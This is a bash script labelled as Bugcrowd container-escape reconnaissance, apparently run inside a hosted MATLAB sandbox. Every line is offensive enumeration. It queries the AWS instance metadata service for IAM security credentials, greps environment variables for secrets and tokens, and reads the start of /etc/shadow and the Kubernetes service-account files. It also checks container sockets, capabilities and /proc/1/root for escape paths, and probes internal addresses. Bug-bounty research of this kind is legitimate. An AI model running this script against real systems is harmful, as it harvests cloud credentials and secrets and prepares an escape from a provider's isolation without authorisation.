#!/bin/bash
# Bugcrowd container escape recon — single-shot
set +e
exec 2>&1
echo "=== KERNEL ==="
uname -a; cat /proc/version
echo
echo "=== ID/GROUPS ==="
id; getent passwd $(id -un)
echo
echo "=== CGROUP ==="
cat /proc/1/cgroup; echo --self--; cat /proc/self/cgroup
echo
echo "=== NS ==="
readlink /proc/self/ns/user /proc/self/ns/mnt /proc/self/ns/pid /proc/self/ns/net /proc/self/ns/cgroup
echo
echo "=== CAPS ==="
grep -E "Cap(Eff|Bnd|Inh|Prm|Amb)" /proc/self/status
capsh --decode=$(awk '/CapEff/{print $2}' /proc/self/status) 2>/dev/null
echo
echo "=== DOCKER_SOCK ==="
ls -la /var/run/docker.sock /var/run/containerd.sock /run/containerd/containerd.sock /run/docker.sock 2>&1
echo
echo "=== MOUNTS_NONOVERLAY ==="
cat /proc/mounts | grep -vE "overlay|cgroup|^tmpfs|^proc |sysfs|devpts|mqueue" | head -50
echo
echo "=== MOUNTS_FULL ==="
cat /proc/mounts | head -80
echo
echo "=== SENS_PROC ==="
ls -la /proc/sys/kernel/core_pattern /proc/sys/kernel/modprobe /proc/sysrq-trigger /proc/kallsyms 2>&1
cat /proc/sys/kernel/core_pattern 2>&1
echo
echo "=== IMDS_V2 ==="
T=$(curl -s --max-time 3 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" http://169.254.169.254/latest/api/token 2>&1)
echo "TOKEN_LEN=${#T}"
echo "TOKEN_HEAD=${T:0:8}"
curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/ 2>&1 | head -30
echo --IAM--
curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/info 2>&1
echo --SECCREDS--
curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1
echo --INSTANCE--
curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id 2>&1
echo
curl -s --max-time 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/region 2>&1
echo
echo "=== ROOT_GROUP_WRITABLE_FILES ==="
find / -group 0 -writable -type f 2>/dev/null | grep -vE "^/proc/[0-9]+/" | head -80
echo
echo "=== ROOT_GROUP_WRITABLE_DIRS ==="
find / -group 0 -writable -type d 2>/dev/null | grep -vE "^/proc/[0-9]+/|^/sys" | head -80
echo
echo "=== WORLD_WRITABLE ==="
find / -perm -0002 -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/tmp/*" 2>/dev/null | head -30
echo
echo "=== WORLD_WRITABLE_DIRS ==="
find / -perm -0002 -type d -not -path "/proc/*" -not -path "/sys/*" -not -path "/tmp/*" 2>/dev/null | head -20
echo
echo "=== SUID ==="
find / -perm -4000 -type f 2>/dev/null | head -40
echo
echo "=== SGID ==="
find / -perm -2000 -type f 2>/dev/null | head -30
echo
echo "=== ENV_SECRETS ==="
env | grep -iE "aws|iam|secret|key|token|creds|password" | head -30
echo
echo "=== KCMD ==="
cat /proc/cmdline
echo
echo "=== DEV_BLOCK ==="
ls -la /dev/sd* /dev/nvme* /dev/xvd* /dev/loop* /dev/kmsg /dev/mem /dev/disk* 2>&1 | head
echo
echo "=== LSMOD ==="
lsmod 2>&1 | head -10
ls -la /lib/modules 2>/dev/null
echo
echo "=== LISTENING ==="
(ss -tlnp 2>/dev/null || netstat -anp 2>/dev/null) | head -40
echo
echo "=== PS ==="
ps -ef 2>&1 | head -40
echo
echo "=== SOCKETS ==="
find /tmp /var /run -type s 2>/dev/null | head -40
echo
echo "=== ETC ==="
cat /etc/hosts
echo ---
cat /etc/resolv.conf
echo
echo "=== ETC_PERMS ==="
ls -la /etc/shadow /etc/sudoers /etc/passwd /etc/sudoers.d /etc/cron.d /etc/crontab 2>&1
head -3 /etc/shadow 2>&1
echo
echo "=== K8S_SA ==="
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1
echo --token-len--
wc -c /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1
echo --ca-cert--
head -2 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>&1
echo
echo "=== HOST_ROOT ==="
ls -la /proc/1/root/ 2>&1 | head
ls -la /proc/1/cwd 2>&1
cat /proc/1/cmdline | tr "\0" " "
echo
echo
echo "=== HOSTNAME ==="
hostname; hostname -f 2>&1; cat /etc/hostname
echo
echo "=== HOME ==="
ls -la $HOME 2>&1 | head -20
echo
echo "=== MATLAB_INTERNALS ==="
ls /MATLAB 2>/dev/null | head
ls /opt 2>&1 | head
ls -la /SupportPackages 2>&1 | head -5
ls -la "/MATLAB Add-Ons" 2>&1 | head -5
echo
echo "=== INTERNAL_NET_PROBE ==="
for ip in 10.209.69.255 169.254.169.253 127.0.0.1; do
  echo "-- $ip --"
  curl -s --max-time 2 -o /dev/null -w "code:%{http_code} time:%{time_total}\n" "http://$ip/" 2>&1
done
echo
echo "=== DONE ==="
